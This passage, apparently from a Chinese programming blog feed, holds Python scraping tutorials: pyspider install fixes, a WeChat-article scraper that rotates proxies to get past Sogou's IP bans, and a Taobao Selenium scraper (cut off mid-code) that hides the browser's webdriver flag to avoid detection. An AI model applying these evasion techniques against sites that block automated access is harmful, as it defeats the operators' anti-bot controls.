srcset="/img/loading.gif" lazyload></li></ul><p><strong>报错信息：</strong></p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sml"><span class="hljs-type">ValueError</span>: <span class="hljs-type">Invalid</span> configuration:<br>  - <span class="hljs-type">Deprecated</span> <span class="hljs-built_in">option</span> <span class="hljs-symbol">&#x27;domaincontroller&#x27;</span>: use <span class="hljs-symbol">&#x27;http_authenticator</span>.domain_controller&#x27; instead.<br><br></code></pre></td></tr></table></figure><p>这个是因为wsgidav版本太高了，重新安装一下：<br><code>pip install wsgidav==2.4.1</code></p><ul><li>在运行，还报错：<br><img src="https://p.pstatp.com/origin/fef200036a88bb09b5da" srcset="/img/loading.gif" lazyload></li></ul><p><strong>报错信息：</strong></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">ImportError</span>: cannot <span class="hljs-keyword">import</span> name <span class="hljs-string">&#x27;DispatcherMiddleware&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;werkzeug.wsgi&#x27;</span> (<span class="hljs-name">d</span>:\python\venv\lib\site-packages\werkzeug\wsgi.py)<br><br></code></pre></td></tr></table></figure><p>这是因为werkzeug版本高了，DispatcherMiddleware这个类已经不存在了，因此重新安装小版本：</p><p><code>pip install werkzeug=0.16</code><br>为什么是0.16版本？我是再卸载后，暂不安装，直接执行pyspider时，错误提示信息中显示了最低版本为0.16：）</p><ul><li>再次运行 pyspider all 填坑完毕，纪念一下<br><img src="https://p.pstatp.com/origin/13858000236106042f24a" srcset="/img/loading.gif" lazyload></li></ul><h1 id="其他错误"><a href="#其他错误" class="headerlink" title="其他错误"></a>其他错误</h1><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"> D:<span class="hljs-symbol">\p</span>ython&gt;pyspider all<br>d:<span class="hljs-symbol">\p</span>ython<span class="hljs-symbol">\v</span>env<span class="hljs-symbol">\l</span>ib<span class="hljs-symbol">\s</span>ite-packages<span class="hljs-symbol">\p</span>yspider<span class="hljs-symbol">\l</span>ibs<span class="hljs-symbol">\u</span>tils.py:196: FutureWarning: timeout is not supported on your platform.<br>  warnings.warn(&quot;timeout is not supported on your platform.&quot;, FutureWarning)<br><br></code></pre></td></tr></table></figure><p>忽视即可。</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用代理池处理反爬抓取微信文章</title>
    <link href="/2021/01/61.html"/>
    <url>/2021/01/61.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>搜狗（<a href="http://weixin.sogou.com/%EF%BC%89%E5%B7%B2%E7%BB%8F%E4%B8%BA%E6%88%91%E4%BB%AC%E5%81%9A%E4%BA%86%E4%B8%80%E5%B1%82%E5%BE%AE%E4%BF%A1%E6%96%87%E7%AB%A0%E7%9A%84%E7%88%AC%E5%8F%96%EF%BC%8C%E9%80%9A%E8%BF%87%E5%AE%83%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E4%B8%80%E4%BA%9B%E5%BE%AE%E4%BF%A1%E6%96%87%E7%AB%A0%E7%9A%84%E5%88%97%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BF%A1%E6%81%AF%EF%BC%8C">http://weixin.sogou.com/）已经为我们做了一层微信文章的爬取，通过它我们可以获取一些微信文章的列表以及微信公众号的一些信息，</a><br>但是它有很多反爬虫的措施，可以检测到你的IP异常，然后把你封掉。<br>本文采用代理的方法处理反爬来抓取微信文章。</p></blockquote><a id="more"></a><h1 id="用到的"><a href="#用到的" class="headerlink" title="用到的"></a>用到的</h1><ul><li>urllib</li><li>lxml</li><li>pyquery</li><li>requests</li><li>re</li><li>pymongo</li><li>sys</li></ul><h1 id="代理池"><a href="#代理池" class="headerlink" title="代理池"></a>代理池</h1><ul><li><a href="https://github.com/Python3WebSpider/ProxyPool">https://github.com/Python3WebSpider/ProxyPool</a></li></ul><h1 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h1><p><img src="https://p.pstatp.com/origin/137fe00030644a02199da" srcset="/img/loading.gif" lazyload></p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">@Time ： 2021/1/27 12:29</span><br><span class="hljs-string">@Auth ： Ne-21</span><br><span class="hljs-string">@File ：weixin_spider.py</span><br><span class="hljs-string">@IDE ：PyCharm</span><br><span class="hljs-string">@Motto：Another me.</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode<br><span class="hljs-keyword">from</span> lxml.etree <span class="hljs-keyword">import</span> XMLSyntaxError<br><span class="hljs-keyword">from</span> pyquery <span class="hljs-keyword">import</span> PyQuery <span class="hljs-keyword">as</span> pq<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> pymongo<br><span class="hljs-keyword">import</span> sys<br><br>sys.setrecursionlimit(<span class="hljs-number">3000</span>)  <span class="hljs-comment"># 将默认的递归深度修改为3000</span><br><br>base_url = <span class="hljs-string">&#x27;https://weixin.sogou.com/weixin?&#x27;</span><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;https://weixin.sogou.com/weixin?query=%E9%A3%8E%E6%99%AF&amp;type=2&amp;page=1&amp;ie=utf8&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;document&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;navigate&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-origin&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="hljs-string">&#x27;?1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 &#x27;</span><br>                  <span class="hljs-string">&#x27;Safari/537.36&#x27;</span>,<br>    <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;weixin.sogou.com&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;<br>keyword = <span class="hljs-string">&#x27;云计算&#x27;</span><br><br><span class="hljs-comment"># 获取、设置全局代理</span><br>proxy_pool_url = <span class="hljs-string">&#x27;http://127.0.0.1:5555/random&#x27;</span><br>proxy = <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 最大请求次数</span><br>max_count = <span class="hljs-number">5</span><br><br><span class="hljs-comment"># MongoDB</span><br>MONGO_URL = <span class="hljs-string">&#x27;localhost&#x27;</span><br>MONGO_DB = <span class="hljs-string">&#x27;weixin&#x27;</span><br>MONGO_TABLE = <span class="hljs-string">&#x27;articles&#x27;</span><br><br>client = pymongo.MongoClient(MONGO_URL)<br>db = client[MONGO_DB]<br><br><span class="hljs-comment"># 获取代理信息</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_proxy</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(proxy_pool_url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> ConnectionError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-comment"># 搜索</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_index</span>(<span class="hljs-params">keyword, page</span>):</span><br>    data = &#123;<br>        <span class="hljs-string">&#x27;query&#x27;</span>: keyword,<br>        <span class="hljs-string">&#x27;page&#x27;</span>: page,<br>        <span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;2&#x27;</span><br>    &#125;<br>    queries = urlencode(data)<br>    url = base_url + queries<br>    html = get_html(url)<br>    <span class="hljs-keyword">return</span> html<br><br><br><span class="hljs-comment"># 获取搜索页面信息</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_html</span>(<span class="hljs-params">url, count=<span class="hljs-number">1</span></span>):</span><br>    print(<span class="hljs-string">&#x27;请求目标网址&#x27;</span>, url)<br>    print(<span class="hljs-string">&#x27;当前请求次数&#x27;</span>, count)<br>    <span class="hljs-keyword">global</span> proxy<br>    <span class="hljs-comment"># 判断请求次数</span><br>    <span class="hljs-keyword">if</span> count == max_count:<br>        print(<span class="hljs-string">&#x27;请求次数过多&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 是否有代理</span><br>        <span class="hljs-keyword">if</span> proxy:<br>            proxies = &#123;<br>                <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;http://&#x27;</span> + proxy<br>            &#125;<br>            response = requests.get(url, headers=headers, allow_redirects=<span class="hljs-literal">False</span>, proxies=proxies)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># allow_redirects=False 不处理自动跳转</span><br>            response = requests.get(url, headers=headers, allow_redirects=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">302</span>:<br>            <span class="hljs-comment"># need proxy</span><br>            print(<span class="hljs-string">&#x27;302&#x27;</span>)<br>            proxy = get_proxy()<br>            <span class="hljs-keyword">if</span> proxy:<br>                print(<span class="hljs-string">&#x27;Using Proxy&#x27;</span>, proxy)<br>                <span class="hljs-comment"># count += 1</span><br>                <span class="hljs-keyword">return</span> get_html(url)<br>            <span class="hljs-keyword">else</span>:<br>                print(<span class="hljs-string">&#x27;Get Proxy Failed&#x27;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> ConnectionError <span class="hljs-keyword">as</span> e:<br>        print(<span class="hljs-string">&#x27;Error&#x27;</span>, e.args)<br>        proxy = get_proxy()<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> get_html(url, count)<br><br><br><span class="hljs-comment"># 解析搜索页面</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_index</span>(<span class="hljs-params">html</span>):</span><br>    doc = pq(html)<br>    items = doc(<span class="hljs-string">&#x27;.news-box .news-list li .txt-box h3 a&#x27;</span>).items()<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">yield</span> <span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;https://weixin.sogou.com&#x27;</span>) + item.attr(<span class="hljs-string">&#x27;href&#x27;</span>)<br><br><br><span class="hljs-comment"># 获取真实的文章地址</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_detail_true_url</span>(<span class="hljs-params">url</span>):</span><br>    <span class="hljs-keyword">global</span> proxy<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> proxy:<br>            proxies = &#123;<br>                <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;http://&#x27;</span> + <span class="hljs-built_in">str</span>(proxy)<br>            &#125;<br>            response = requests.get(url, headers=headers, allow_redirects=<span class="hljs-literal">False</span>, proxies=proxies)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># allow_redirects=False 不处理自动跳转</span><br>            response = requests.get(url, headers=headers, allow_redirects=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            response = response.text<br>            url_param = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&quot;url \+= &#x27;(.*?)&#x27;;&quot;</span>, re.S).findall(response)<br>            true_url = <span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> url_param:<br>                true_url += i<br>            true_url.replace(<span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">return</span> true_url<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> get_detail_true_url(url)<br><br><br><span class="hljs-comment"># 获取文章详情</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_detail</span>(<span class="hljs-params">true_url</span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(true_url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            response = response.text<br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> ConnectionError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-comment"># 解析文章</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_detail</span>(<span class="hljs-params">html</span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        doc = pq(html)<br>        title = doc(<span class="hljs-string">&#x27;.rich_media_title&#x27;</span>).text()<br>        content = doc(<span class="hljs-string">&#x27;.rich_media_content&#x27;</span>).text()<br>        date = doc(<span class="hljs-string">&#x27;#publish_time&#x27;</span>).text()<br>        nickname = doc(<span class="hljs-string">&#x27;#js_name&#x27;</span>).text()<br>        wechat = doc(<span class="hljs-string">&#x27;#js_profile_qrcode &gt; div &gt; p:nth-child(3) &gt; span&#x27;</span>).text()<br>        <span class="hljs-keyword">return</span> &#123;<br>            <span class="hljs-string">&#x27;title&#x27;</span>: title,<br>            <span class="hljs-string">&#x27;content&#x27;</span>: content,<br>            <span class="hljs-string">&#x27;date&#x27;</span>: date,<br>            <span class="hljs-string">&#x27;nickname&#x27;</span>: nickname,<br>            <span class="hljs-string">&#x27;wechat&#x27;</span>: wechat<br>        &#125;<br>    <span class="hljs-keyword">except</span> XMLSyntaxError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save_to_mongo</span>(<span class="hljs-params">data</span>):</span><br>    <span class="hljs-comment"># 如果有一样的，更新，没有，插入</span><br>    <span class="hljs-keyword">if</span> db[MONGO_TABLE].update(&#123;<span class="hljs-string">&#x27;title&#x27;</span>: data[<span class="hljs-string">&#x27;title&#x27;</span>]&#125;, &#123;<span class="hljs-string">&#x27;$set&#x27;</span>: data&#125;, <span class="hljs-literal">True</span>):<br>        print(<span class="hljs-string">&#x27;存储到数据库成功&#x27;</span>, data[<span class="hljs-string">&#x27;title&#x27;</span>])<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&#x27;存储失败&#x27;</span>, data[<span class="hljs-string">&#x27;title&#x27;</span>])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        html = get_index(keyword, page)<br>        <span class="hljs-keyword">if</span> html:<br>            article_urls = parse_index(html)<br>            <span class="hljs-keyword">for</span> article_url <span class="hljs-keyword">in</span> article_urls:<br>                article_html = get_detail_true_url(article_url)<br>                article_true_html = get_detail(article_html)<br>                <span class="hljs-keyword">if</span> article_true_html:<br>                    article_data = parse_detail(article_true_html)<br>                    print(article_data)<br>                    <span class="hljs-keyword">if</span> article_data:<br>                        save_to_mongo(article_data)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用Selenium模拟浏览器抓取淘宝商品美食信息（含模拟登陆）</title>
    <link href="/2021/01/60.html"/>
    <url>/2021/01/60.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>淘宝页面比较复杂，含有各种请求参数和加密参数，如果直接请求或者分析Ajax将会非常繁琐。<br>Selenium是一个自动化测试工具，可以驱动浏览器去完成各种工作，比如模拟点击、输入和下拉等多种功能，这样我们只需关心操作，<br>不需要关心后台发生了怎么样的请求下面对具体操作步骤进行详述。</p></blockquote><a id="more"></a><h1 id="所用到的"><a href="#所用到的" class="headerlink" title="所用到的"></a>所用到的</h1><ul><li>selenium</li><li>pyqurey</li><li>re</li><li>pymongo</li></ul><h1 id="数据库截图"><a href="#数据库截图" class="headerlink" title="数据库截图"></a>数据库截图</h1><p><img src="https://p.pstatp.com/origin/138b50000ce987945cfe4" srcset="/img/loading.gif" lazyload></p><h1 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">@Time ： 2021/1/25 17:02</span><br><span class="hljs-string">@Auth ： Ne-21</span><br><span class="hljs-string">@File ：taobaospider.py</span><br><span class="hljs-string">@IDE ：PyCharm</span><br><span class="hljs-string">@Motto：Another me.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> selenium.common.exceptions <span class="hljs-keyword">import</span> TimeoutException<br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<br><span class="hljs-keyword">from</span> selenium.webdriver.support.ui <span class="hljs-keyword">import</span> WebDriverWait<br><span class="hljs-keyword">from</span> selenium.webdriver.support <span class="hljs-keyword">import</span> expected_conditions <span class="hljs-keyword">as</span> EC<br><span class="hljs-keyword">from</span> selenium.webdriver <span class="hljs-keyword">import</span> ActionChains<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pyquery <span class="hljs-keyword">import</span> PyQuery <span class="hljs-keyword">as</span> pq<br><span class="hljs-keyword">import</span> pymongo<br><br><span class="hljs-comment"># Mongo数据库</span><br>MONGO_URL = <span class="hljs-string">&#x27;localhost&#x27;</span><br>MONGO_DB = <span class="hljs-string">&#x27;taobao&#x27;</span><br>MONGO_TABLE = <span class="hljs-string">&#x27;product&#x27;</span><br>client = pymongo.MongoClient(MONGO_URL)<br>db = client[MONGO_DB]<br><br>options = webdriver.ChromeOptions()<br><span class="hljs-comment"># options.add_argument(&#x27;--blink-settings=imagesEnabled=false&#x27;) # 不加载图片, 提升速度</span><br><span class="hljs-comment"># options.add_argument(&#x27;--headless&#x27;) # 浏览器不提供可视化页面</span><br>browser = webdriver.Chrome(options=options)<br><span class="hljs-comment"># 防止被监测</span><br>browser.execute_cdp_cmd(<span class="hljs-string">&quot;Page.addScriptToEvaluateOnNewDocument&quot;</span>, &#123;<br>    <span class="hljs-string">&quot;source&quot;</span>: <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            Object.defineProperty(navigator, &#x27;webdriver&#x27;, 